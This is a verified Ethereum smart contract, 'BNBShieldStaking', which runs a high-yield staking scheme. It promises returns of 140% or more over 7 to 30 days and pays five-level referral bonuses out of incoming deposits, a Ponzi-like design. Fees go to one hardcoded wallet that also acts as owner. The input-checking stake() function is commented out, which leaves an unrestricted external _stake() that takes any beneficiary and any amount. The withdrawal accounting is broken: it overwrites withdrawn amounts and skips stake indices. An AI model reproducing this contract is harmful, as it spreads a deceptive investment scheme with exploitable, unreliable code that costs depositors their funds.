/**
 *Submitted for verification at Etherscan.io on 2022-01-18
*/

// SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

contract BNBShieldStaking {
    using SafeMath for uint256;

    struct Stake {
        uint256 staked_amount;
        uint256 bonus;
        uint256 daily_bonus;
        uint256 withdrawn_amount;
        uint256 withdraw_time;
    }

    struct User {
        address upline;
        uint256 referral_bonus;
        uint256[5] referrals;
        uint256 stake_count;
        uint256 total_staked;
        uint256 total_withdrawn;
        mapping(uint256 => Stake) user_stakes;
    }

   // address payable private marketing_wallet;
    //address payable public insurance_wallet;

    mapping(address => User) public users;
    uint256 public min_deposit_amount;
    uint256 public max_deposit_amount;
    uint256 public min_withdrawal_amount;
    uint256 public basic_bonus;
    uint256 public bonus_constant;
    uint256 public insurance_funds;

    uint256[5] public referral_percents;
    uint256[24] public staking_plans;
    uint256 private marketing_fee; // 10%
    uint256 private development_fee; // 5%
    uint256 private insurance_fee; // 10%
    uint256 public time_step;
    uint256 public constant PERCENTS_DIVIDER = 1000;

    // Totals
    uint256 public total_users = 0;
    uint256 public total_deposited;
    uint256 public total_withdrawn;





     address   public  insurance_wallet = 0x19Aeead1a0E24161c02D12Ee8DE5C152eAD2A010;
    address  public marketing_wallet = 0x19Aeead1a0E24161c02D12Ee8DE5C152eAD2A010;


    event Upline(address indexed addr, address indexed upline);
    event NewDeposit(address indexed addr, uint256 amount);
    event ReferralPayout(
        address indexed addr,
        address indexed from,
        uint256 amount
    );
    event Withdraw(address indexed addr, uint256 amount);
    event LimitReached(address indexed addr, uint256 amount);

    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    constructor(
    ) {
        //insurance_wallet = _insurance_address;
     //   marketing_wallet = _marketing;
      //  development_wallet = _development;

        min_deposit_amount = 0.1 ether;
        max_deposit_amount = 1000 ether;
        min_withdrawal_amount = 0.1 ether;
        basic_bonus = 1400;
        bonus_constant = 69;

        referral_percents = [50, 30, 20, 10, 5];
        marketing_fee = 100; // 10%
        development_fee = 50; // 5%
        insurance_fee = 100; // 10%
        time_step = 1 days;

        for (uint256 i = 0; i < 24; i++) {
            staking_plans[i] = i + 7;
        }
    }

    receive() external payable {}

    function owner() public view returns (address) {
        return marketing_wallet;
    }

    function isStakeActive(address _addr, uint256 stake_id)
        public
        view
        returns (bool _status)
    {
        if (
            users[_addr].user_stakes[stake_id].withdrawn_amount <
            users[_addr].user_stakes[stake_id].bonus
        ) {
            _status = true;
        }
    }

    function _stake(
        address _addr,
       // uint256 _amount,
        address _referrer,
        uint256 plan_index
    ) external payable {
        User storage user = users[_addr];
        uint256 stake_id = ++user.stake_count;
        if (stake_id == 1) {
            total_users++;
            user.upline = _referrer;
        }

        uint256 bonus_percentage = basic_bonus.add(
            bonus_constant.mul(plan_index)
        );
        user.user_stakes[stake_id].staked_amount = msg.value;
        user.user_stakes[stake_id].bonus = msg.value.mul(bonus_percentage).div(
            PERCENTS_DIVIDER
        );
        user.user_stakes[stake_id].daily_bonus = user
            .user_stakes[stake_id]
            .bonus
            .div(staking_plans[plan_index]);
        user.user_stakes[stake_id].withdraw_time = block.timestamp;

        user.stake_count++;
        user.total_staked = user.total_staked.add(msg.value);
        total_deposited = total_deposited.add(msg.value);

        // owner Fee deduction
        payable (marketing_wallet).transfer(
            msg.value.mul(marketing_fee).div(PERCENTS_DIVIDER)
        );
      
        emit NewDeposit(_addr, msg.value);

        if (user.upline != address(0)) {
            address _upline = user.upline;
            for (uint256 i = 0; i < referral_percents.length; i++) {
                if (_upline != address(0)) {
                    if (stake_id == 1) {
                        users[_upline].referrals[i] += 1;
                    }
                    users[_upline].referral_bonus = users[_upline]
                        .referral_bonus
                        .add(
                            msg.value.mul(referral_percents[i]).div(
                                PERCENTS_DIVIDER
                            )
                        );
                    _upline = users[_upline].upline;
                    emit ReferralPayout(
                        users[_addr].upline,
                        _addr,
                        msg.value.mul(referral_percents[i]).div(PERCENTS_DIVIDER)
                    );
                }
            }
        }
    }
/*
    function stake(address _referrer, uint256 plan_index) external payable {
        if (msg.sender == owner()) {
            _referrer = address(0);
        } else {
            require(
                msg.sender != _referrer && _referrer != address(0),
                "No upline"
            );
        }
        require(users[msg.sender].stake_count <= 200, "Stake: Limit reached");
        require(
            msg.value >= min_deposit_amount && msg.value <= max_deposit_amount,
            "Invalid deposited amount"
        );
        require(plan_index < 23, "Invalid staking duration.");

        _stake(msg.sender, msg.value, _referrer, plan_index);
    }
*/
/*
    function restake_referrals_bonus() external {
        User storage user = users[msg.sender];
        require(user.referral_bonus > 0, "Restake: Insufficient balance");
        require(users[msg.sender].stake_count <= 200, "Stake: Limit reached");
        require(
            user.referral_bonus >= min_deposit_amount &&
                user.referral_bonus <= max_deposit_amount,
            "Restake: Invalid amount"
        );

        _stake(msg.sender, user.referral_bonus, user.upline, 0);
        user.referral_bonus = 0;
    }
*/
    function withdraw_referrals_bonus() external {
        User storage user = users[msg.sender];
        require(user.referral_bonus > 0, "Withdraw: Insufficient balance");

        require(
            user.referral_bonus >= min_withdrawal_amount,
            "Refferal: Insufficient min_withdrawal_amount"
        );

        payable(msg.sender).transfer(user.referral_bonus);
        user.referral_bonus = 0;
    }

    function _withdraw(address _addr, uint256 stake_id)
        private
        returns (uint256 dividends)
    {
        User storage user = users[_addr];
        require(
            stake_id > 0 && stake_id < user.stake_count,
            "Invalid stake id."
        );

        dividends = user
            .user_stakes[stake_id]
            .daily_bonus
            .mul(block.timestamp.sub(user.user_stakes[stake_id].withdraw_time))
            .div(time_step);

        if (
            user.user_stakes[stake_id].withdrawn_amount + dividends >
            user.user_stakes[stake_id].bonus
        ) {
            dividends = user.user_stakes[stake_id].bonus.sub(
                user.user_stakes[stake_id].withdrawn_amount
            );
        }

        user.user_stakes[stake_id].withdrawn_amount = dividends;
        user.user_stakes[stake_id].withdraw_time = block.timestamp;

        emit Withdraw(msg.sender, dividends);
        if (
            user.user_stakes[stake_id].withdrawn_amount ==
            user.user_stakes[stake_id].bonus
        ) {
            emit LimitReached(_addr, user.user_stakes[stake_id].bonus);
        }
    }

    function withdraw() external {
        User storage user = users[msg.sender];
        require(user.stake_count > 0, "You did not stake yet.");
        uint256 total_withdrawable_bonus;
        for (uint256 i = 1; i < user.stake_count; i++) {
            if (isStakeActive(msg.sender, i)) {
                total_withdrawable_bonus += _withdraw(msg.sender, i);
            }
        }

        require(
            total_withdrawable_bonus >= min_withdrawal_amount,
            "Withdraw: Insufficient min_withdrawal_amount"
        );
        user.total_withdrawn = user.total_withdrawn.add(
            total_withdrawable_bonus
        );
        total_withdrawn = total_withdrawn.add(total_withdrawable_bonus);

       payable (insurance_wallet).transfer(
            total_withdrawable_bonus.mul(insurance_fee).div(PERCENTS_DIVIDER)
        );
        insurance_funds = insurance_funds.add(total_withdrawable_bonus.mul(insurance_fee).div(PERCENTS_DIVIDER));
        payable(msg.sender).transfer(total_withdrawable_bonus);
    }

    function payoutOf(address _addr) external view returns (uint256 payout) {
        User storage user = users[_addr];
        uint256 available;
        for (uint256 i = 1; i < user.stake_count; i++) {
            if (isStakeActive(_addr, i)) {
                available = user
                    .user_stakes[i]
                    .daily_bonus
                    .mul(block.timestamp.sub(user.user_stakes[i].withdraw_time))
                    .div(time_step);

                if (
                    user.user_stakes[i].withdrawn_amount + available >
                    user.user_stakes[i].bonus
                ) {
                    available = user.user_stakes[i].bonus.sub(
                        user.user_stakes[i].withdrawn_amount
                    );
                }
                payout += available;
            }
        }
    }

    /*
        Only external call
    */

    function getStakePlanInfo(uint256 _amount, uint256 plan_index)
        external
        view
        returns (
            uint256 bonus_percentage,
            uint256 bonus,
            uint256 daily_bonus
        )
    {
        bonus_percentage = basic_bonus.add(bonus_constant.mul(plan_index));
        bonus = _amount.mul(bonus_percentage).div(PERCENTS_DIVIDER);
        daily_bonus = bonus.div(staking_plans[plan_index]);
    }

    function userInfo(address _addr, uint256 _stake_id)
        external
        view
        returns (
            uint256 deposit_amount,
            uint256 withdrawn_amount,
            uint256 bonus,
            uint256 daily_bonus
        )
    {
        return (
            users[_addr].user_stakes[_stake_id].staked_amount,
            users[_addr].user_stakes[_stake_id].withdrawn_amount,
            users[_addr].user_stakes[_stake_id].bonus,
            users[_addr].user_stakes[_stake_id].daily_bonus
        );
    }

    function userReferralsInfo(address _addr)
        external
        view
        returns (
            uint256 level1,
            uint256 level2,
            uint256 level3,
            uint256 level4,
            uint256 level5
        )
    {
        return (
            users[_addr].referrals[0],
            users[_addr].referrals[1],
            users[_addr].referrals[2],
            users[_addr].referrals[3],
            users[_addr].referrals[4]
        );
    }

    function userInfoTotals(address _addr)
        external
        view
        returns (
            uint256 referral_bonus,
            uint256 total_staked_amount,
            uint256 total_withdrawn_amount
        )
    {
        return (
            users[_addr].referral_bonus,
            users[_addr].total_staked,
            users[_addr].total_withdrawn
        );
    }

    function contractInfo()
        external
        view
        returns (
            uint256 _total_users,
            uint256 _total_deposited,
            uint256 _total_withdrawn
        )
    {
        return (total_users, total_deposited, total_withdrawn);
    }

    function getContractBalance() public view returns (uint256) {
        return (address(this).balance);
    }
}

library SafeMath {
    function tryAdd(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}